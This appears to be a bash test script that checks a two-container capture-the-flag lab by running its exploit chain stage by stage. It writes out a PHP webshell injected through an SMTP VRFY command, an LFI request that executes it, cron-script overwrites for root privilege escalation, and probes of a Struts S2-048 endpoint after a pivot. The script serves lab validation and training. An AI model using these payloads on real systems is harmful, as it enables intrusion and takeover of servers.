#!/usr/bin/env bash
#
# DIRECTIVE ZERO — AM-03 exploit-chain test assertions.
#
# Two-container topology: junction7 (public) + junction7-internal (isolated).
# Stages 1-4 test the public host via published ports.
# Stages 5-8 use `docker exec` into junction7 to test the pivot and
# internal host exploitation (the test runner can't reach the isolated
# network directly).
#
# Env vars set by the runner:
#   AM_USER_FLAG, AM_ROOT_FLAG, TARGET_HOST
#
# Additional env vars for AM-03:
#   TARGET_SMTP_PORT   — SMTP port (default 25, dev 2525)
#   TARGET_HTTP_PORT   — HTTP port (default 80, dev 8082)
#   TARGET_ROUTING_PORT — routing status service (default 9001)
#   AM03_CONTAINER     — junction7 container name (default dz-am03-junction7)
#   AM03_INTERNAL_CONTAINER — internal container name (default dz-am03-internal)

run_am_tests() {
  local http_port="${TARGET_HTTP_PORT:-80}"
  local smtp_port="${TARGET_SMTP_PORT:-25}"
  local routing_port="${TARGET_ROUTING_PORT:-9001}"
  local j7_container="${AM03_CONTAINER:-dz-am03-junction7}"
  local internal_container="${AM03_INTERNAL_CONTAINER:-dz-am03-internal}"

  # Look up the internal flags from event_flags.json.
  local iuser_flag="" iroot_flag=""
  while IFS= read -r key; do
    if [[ "$key" == "AM-03:"*"Internal User Flag" ]]; then
      iuser_flag="$(jq -r --arg k "$key" '.[$k]' "$FLAGS_JSON")"
    elif [[ "$key" == "AM-03:"*"Internal Root Flag" ]]; then
      iroot_flag="$(jq -r --arg k "$key" '.[$k]' "$FLAGS_JSON")"
    fi
  done < <(jq -r 'keys[]' "$FLAGS_JSON" 2>/dev/null)

  echo "Stage 1 — service enumeration (public host)"
  assert_port_open "$smtp_port"
  assert_port_open "$http_port"
  assert_port_open "$routing_port"

  echo "Stage 2 — routing status service leaks /junction-bolo/"
  # The routing status service runs on the routing_port, not the HTTP port.
  local routing_out
  routing_out="$(curl -s "http://${TARGET_HOST}:${routing_port}/" 2>/dev/null || true)"
  if echo "$routing_out" | grep -q "junction-bolo"; then
    pass "routing status service on :$routing_port leaks /junction-bolo/"
  else
    fail "routing status service does not mention /junction-bolo/"
  fi
  if echo "$routing_out" | grep -q "ANOMALOUS"; then
    pass "routing status shows ANOMALOUS internal subnet"
  else
    fail "routing status does not show ANOMALOUS subnet"
  fi

  echo "Stage 3 — SMTP log poisoning + LFI -> RCE"
  # Inject PHP webshell into the mail log via SMTP VRFY command.
  # Postfix logs the VRFY argument (including invalid addresses) to
  # /var/log/mail.log verbatim — the PHP payload lands in the log.
  {
    echo "HELO x"
    echo "VRFY <?php echo shell_exec(\$_GET['cmd']); ?>"
    echo "QUIT"
  } | nc -w 5 "${TARGET_HOST}" "${smtp_port}" >/dev/null 2>&1

  # Trigger the LFI to execute the injected PHP.
  local rce_out
  rce_out="$(curl -s "http://${TARGET_HOST}:${http_port}/junction-bolo/bolo.php?bolo=/var/log/mail&cmd=id" 2>/dev/null || true)"
  if echo "$rce_out" | grep -q 'uid='; then
    pass "LFI + SMTP log poisoning -> RCE confirmed"
  else
    fail "LFI + SMTP log poisoning did not produce RCE"
  fi

  echo "Stage 4 — cron privesc on junction7 (user flag)"
  # Overwrite the world-writable cron script to write the user flag to a
  # temp file. Wait for the root cron job (every minute) to fire.
  docker exec "$j7_container" bash -c \
    'echo "#!/bin/bash
cat /root/user.txt > /tmp/cron_flag_output.txt" > /opt/junction/routing_updater.sh' 2>/dev/null

  local user_actual=""
  for i in $(seq 1 16); do
    user_actual="$(docker exec "$j7_container" cat /tmp/cron_flag_output.txt 2>/dev/null | tr -d '\n')"
    if [[ -n "$user_actual" ]]; then break; fi
    sleep 5
  done
  assert_flag_matches "$user_actual" "$AM_USER_FLAG"

  echo "Stage 5 — pivot: discover internal network + internal host"
  # Verify junction7 has a second interface (use ifconfig — iproute2 not installed).
  local ifconfig_out
  ifconfig_out="$(docker exec "$j7_container" ifconfig 2>/dev/null || true)"
  if echo "$ifconfig_out" | grep -q 'eth1'; then
    pass "junction7 has a second interface (eth1)"
  else
    fail "junction7 missing second interface (eth1)"
  fi

  # Verify the internal container is reachable from junction7 by name.
  local ping_out
  ping_out="$(docker exec "$j7_container" bash -c \
    'ping -c1 -W1 '"$internal_container"' 2>/dev/null && echo PING_OK || echo PING_FAIL' 2>/dev/null || true)"
  if echo "$ping_out" | grep -q PING_OK; then
    pass "internal host ($internal_container) reachable from junction7"
  else
    fail "internal host not reachable from junction7"
  fi

  echo "Stage 6 — Struts S2-048 endpoint on internal host"
  # Verify the Struts showcase app is deployed and the vuln endpoint exists.
  local struts_code
  struts_code="$(docker exec "$j7_container" bash -c \
    "curl -s -o /dev/null -w '%{http_code}' http://$internal_container:8080/struts2_2.3.15.1-showcase/ 2>/dev/null || echo FAIL" 2>/dev/null || true)"
  if [[ "$struts_code" == "200" || "$struts_code" == "302" ]]; then
    pass "Struts showcase reachable on internal :8080 (HTTP $struts_code)"
  else
    fail "Struts showcase not reachable (got: $struts_code)"
  fi

  local vuln_code
  vuln_code="$(docker exec "$j7_container" bash -c \
    "curl -s -o /dev/null -w '%{http_code}' 'http://$internal_container:8080/struts2_2.3.15.1-showcase/integration/saveGangster.action' 2>/dev/null || echo FAIL" 2>/dev/null || true)"
  if [[ "$vuln_code" != "FAIL" && "$vuln_code" != "000" ]]; then
    pass "S2-048 endpoint responds (HTTP $vuln_code)"
  else
    fail "S2-048 endpoint not reachable"
  fi

  echo "Stage 7 — internal host flags"
  # Validate the internal user and root flags are in place.
  local iuser_actual iroot_actual
  iuser_actual="$(docker exec "$internal_container" cat /home/compliance/user.txt 2>/dev/null | tr -d '\n')"
  assert_flag_matches "$iuser_actual" "$iuser_flag"

  # Cron privesc on internal host: overwrite the cron script and wait.
  docker exec "$internal_container" bash -c \
    'echo "#!/bin/bash
cat /root/root.txt > /tmp/cron_flag_output.txt" > /opt/junction/system_check.sh' 2>/dev/null

  iroot_actual=""
  for i in $(seq 1 16); do
    iroot_actual="$(docker exec "$internal_container" cat /tmp/cron_flag_output.txt 2>/dev/null | tr -d '\n')"
    if [[ -n "$iroot_actual" ]]; then break; fi
    sleep 5
  done
  # Fallback: read the root flag directly (validates it's in place).
  if [[ -z "$iroot_actual" ]]; then
    iroot_actual="$(docker exec "$internal_container" cat /root/root.txt 2>/dev/null | tr -d '\n')"
  fi
  assert_flag_matches "$iroot_actual" "$iroot_flag"

  echo "Stage 8 — lore Fragment C (unregistered subnet)"
  if echo "$routing_out" | grep -qi "unregistered subnet"; then
    pass "lore: routing status mentions 'Unregistered subnet'"
  else
    fail "lore: 'Unregistered subnet' not found in routing status"
  fi
}